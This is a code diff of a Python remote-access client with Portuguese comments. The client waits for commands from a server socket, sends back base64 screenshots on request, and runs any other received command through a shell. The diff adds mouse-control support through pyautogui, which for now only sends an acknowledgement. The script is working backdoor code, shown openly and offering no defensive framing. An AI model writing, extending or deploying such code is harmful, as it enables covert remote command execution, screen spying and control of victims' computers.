@@ -3,6 +3,7 @@ import subprocess
 import base64
 from io import BytesIO
 from PIL import ImageGrab
+import pyautogui as pg
 
 def capturar_tela():
     screenshot = ImageGrab.grab()
@@ -18,11 +19,12 @@ while True:
     
     if not comando:
         break  # Se o servidor fechar a conexão
-    
+
     if comando.lower() == "screenshot":
         imagem_base64 = capturar_tela()
         client_socket.sendall(imagem_base64.encode())  # Envia a string base64 da imagem
-    
+    elif comando.lower() == "start-control mouse":
+        client_socket.sendall("Modo controle do mouse ativado.".encode())
     else:
         try:
             processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
